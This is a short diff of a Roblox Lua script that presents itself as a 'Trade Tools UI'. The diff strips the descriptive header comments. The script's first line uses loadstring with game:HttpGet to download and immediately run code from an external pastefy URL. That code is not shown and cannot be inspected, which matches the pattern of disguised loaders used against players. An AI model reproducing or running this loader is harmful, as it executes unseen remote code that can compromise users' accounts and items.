@@ -1,7 +1,5 @@
 loadstring(game:HttpGet("https://pastefy.app/cCkDY3ZO/raw"))()
 
--- LocalScript (PLACE THIS IN StarterGui)
--- Trade Tools UI: draggable, trade popup, credits (Inspired by Grow A Garden style, made by "gscriptt")
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
